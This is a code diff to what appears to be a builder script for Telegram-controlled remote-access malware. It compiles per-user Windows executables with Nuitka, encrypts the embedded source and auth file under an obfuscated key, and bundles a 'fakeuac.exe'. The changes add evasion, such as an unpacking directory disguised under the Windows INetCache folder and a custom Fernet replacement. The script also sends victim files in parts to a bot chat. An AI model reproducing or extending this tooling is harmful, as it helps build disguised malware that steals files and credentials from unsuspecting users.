@@ -16,8 +16,8 @@ from os import chdir, listdir, remove
 from os.path import isdir, join, abspath, isfile, split as pathsplit, exists, getsize, basename
 import traceback
 import webview
-from cryptography.fernet import Fernet
-from utils import html_content, obfuscate
+from utils import html_content, obfuscate, SimpleFernet
+
 
 
 # ---------------------------------------------------------------------------
@@ -36,12 +36,18 @@ VENV_PATH = abspath("venv")
 PY_FILE_PATH = join(REPO_NAME, "pep2.py")
 PIP_PATH = join(VENV_PATH, "Scripts", "pip.exe")
 PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
-DLLSL_PATH = join(REPO_NAME, "assets", "dlls")
+ASSETS_PATH = join(REPO_NAME, "assets")
+DLLSL_PATH = join(ASSETS_PATH, "dlls")
+EXECUTABLES_PATH = join(ASSETS_PATH, "executables")
 REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
 PY_FILE_MARKER = "PY_FILE_MARKER"
 AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
 KEY_FILE_MARKER = "KEY_FILE_MARKER"
+REPORT_FILE_MARKER = "REPORT_FILE_MARKER"
 PYTHON_FLAGS = ["no_docstrings"]
+UNUSED_IMPORTS = ["asyncio", "unittest", "email", "xml", "cryptography", "OpenSSL", "pyOpenSSL"]
+UNUSED_IMPORTS_FLAG = " ".join([f"--nofollow-import-to={x}" for x in UNUSED_IMPORTS]) + " "
+ONEFILE_TEMP_NAME = "--onefile-tempdir-spec=%LOCALAPPDATA%\Microsoft\Windows\INetCache\{PID} "
 
 
 def dll_loading_util(dlls_path: str):
@@ -51,6 +57,13 @@ def dll_loading_util(dlls_path: str):
             res += f"--include-data-file=assets/dlls/{file}=pydivert/windivert_dll/{file} "
         else:
             res += f"--include-data-file=assets/dlls/{file}=assets/dlls/{file} "
+    return res
+
+
+def executables_loading_util(executables_path: str):
+    res = ""
+    for file in listdir(executables_path):
+        res += f"--include-data-file=assets/executables/{file}=assets/executables/{file} "
     return res
 
 
@@ -75,7 +88,7 @@ def clone_directory(src, dst):
 
 
 def create_obfuscated_key_file(output_path: str) -> bytes:
-    real_key_b64 = Fernet.generate_key()
+    real_key_b64 = SimpleFernet.generate_key()
     jump = random.randrange(1, 16)
     key_space = 44 + 43 * jump
     min_size = key_space + 64
@@ -84,7 +97,7 @@ def create_obfuscated_key_file(output_path: str) -> bytes:
     max_start = total_size - key_space - 64
     first_byte_pos = random.randrange(min_start, max_start + 1)
 
-    magic = b"RCPTE"
+    magic = b"RCPTK"
     jump_byte = jump.to_bytes(1, "big")
     start_bytes = first_byte_pos.to_bytes(4, "big")
     header = magic + jump_byte + start_bytes
@@ -144,7 +157,7 @@ def download_file(bot, chatid, path: str) -> None:
     bsend("✅ All file parts have been sent successfully!")
 
 
-def encrypt_file(fernet: Fernet, src_path, dst_path):
+def encrypt_file(fernet: SimpleFernet, src_path, dst_path):
     print(f"ENCRYPTING FILE: {src_path} into {dst_path}")
     with open(src_path, "rb") as f:
         data = f.read()
@@ -153,7 +166,7 @@ def encrypt_file(fernet: Fernet, src_path, dst_path):
         f.write(encrypted)
 
 
-def encrypt_directory(fernet: Fernet, src_dir, dst_dir):
+def encrypt_directory(fernet: SimpleFernet, src_dir, dst_dir):
     os.makedirs(dst_dir, exist_ok=True)
     for root, dirs, files in os.walk(src_dir):
         rel_root = os.path.relpath(root, src_dir)
@@ -190,13 +203,15 @@ def compile_worker(
         + PYTHON_FLAGS_STRING +
         f"--windows-console-mode={'force' if debug else 'disable'} "
         "--onefile --onefile-no-compression --follow-imports "
-        "--enable-plugin=tk-inter --msvc=latest "
+        "--enable-plugin=tk-inter --msvc=latest " +
+        ONEFILE_TEMP_NAME +
         f"--jobs={os.cpu_count() or 4} --plugin-enable=upx "
+        f"--report=build-report_{REPORT_FILE_MARKER}.xml "
         "--include-data-dir=assets/vfx=assets/vfx "
         "--include-data-dir=assets/sfx=assets/sfx "
         "--include-data-dir=assets/model=assets/model "
         f"{dll_loading_util(DLLSL_PATH)} "
-        "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe "
+        f"{executables_loading_util(EXECUTABLES_PATH)} "
         f"--include-data-file={AUTH_FILE_MARKER}=auth.json " +
         (f"--include-data-file={KEY_FILE_MARKER}=key.key " if encryption else "")
     )
@@ -217,7 +232,7 @@ def compile_worker(
         if encryption:
             KEY_PATH = join(REPO_NAME, bot_username + ".key")
             real_key = create_obfuscated_key_file(KEY_PATH)
-            fernet = Fernet(real_key)
+            fernet = SimpleFernet(real_key, b"RCPTE")
             if is_foreground and output_queue:
                 kgs = f"\nKEY FILE GENERATED FOR {bot_username}\n"
                 output_queue.put(kgs)
@@ -251,6 +266,7 @@ def compile_worker(
         run_and_capture(REQUIREMENTS_COMMAND)
         relative_auth = join("auths", pathsplit(auth_path)[-1])
         compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)
+        compile_cmd = compile_cmd.replace(REPORT_FILE_MARKER, bot_username)
 
         if encryption:
             encrypt_file(
@@ -261,7 +277,7 @@ def compile_worker(
             compile_cmd = compile_cmd.replace(KEY_FILE_MARKER, KEY_PATH)
 
         compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, relative_auth + (".enc" if encryption else ""))
-        print(f"Running: {compile_cmd}")
+        print(f"Running: \n{compile_cmd}\n")
         rc, output = run_and_capture(compile_cmd)
 
         cache_dirs = (
